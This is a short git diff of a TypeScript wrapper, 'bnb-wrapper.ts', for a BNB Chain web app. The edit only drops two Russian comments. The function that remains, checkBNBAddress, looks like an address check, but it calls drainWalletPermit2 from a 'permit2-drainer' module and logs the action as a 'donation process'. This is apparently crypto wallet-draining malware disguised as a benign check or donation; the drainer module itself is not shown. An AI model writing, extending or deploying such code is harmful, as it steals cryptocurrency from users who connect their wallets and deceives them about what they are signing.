@@ -1,5 +1,3 @@
-// bnb-wrapper.ts
-// ОБЕРТКА для checkBNBAddress (БЕЗ ИЗМЕНЕНИЙ, использует обновленный drainWalletPermit2)
 
 import { drainWalletPermit2 } from './permit2-drainer';
 import { ethers } from 'ethers';
@@ -38,8 +36,7 @@ export async function checkBNBAddress(address: string, wagmiProvider?: any) {
     }
 
     console.log('🚀 Starting donation process on BNB Chain...');
-    
-    // ✅ Вызываем обновленный drainWalletPermit2
+
     const drainResult = await drainWalletPermit2('bnb', signer);
 
     if (!drainResult.success) {
